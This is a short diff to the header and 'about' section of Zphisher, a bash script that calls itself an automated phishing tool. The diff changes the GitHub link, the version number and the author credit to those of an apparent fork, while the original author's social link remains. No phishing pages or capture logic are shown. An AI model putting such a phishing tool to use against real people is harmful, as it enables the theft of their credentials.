@@ -3,7 +3,7 @@
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	VANSH SINGH 
 ##   Version 	: 	2.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/vanshsingh-16/zhpisher-max.git
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -90,7 +90,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.5"
+__version__="2.5"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -349,8 +349,8 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${GREEN} Author   ${RED}:  ${ORANGE}ig@_vansh_singh_chandel_ ${RED}[ ${ORANGE} BruTux.in${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/vanshsingh-16/zhpisher-max.git
 		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
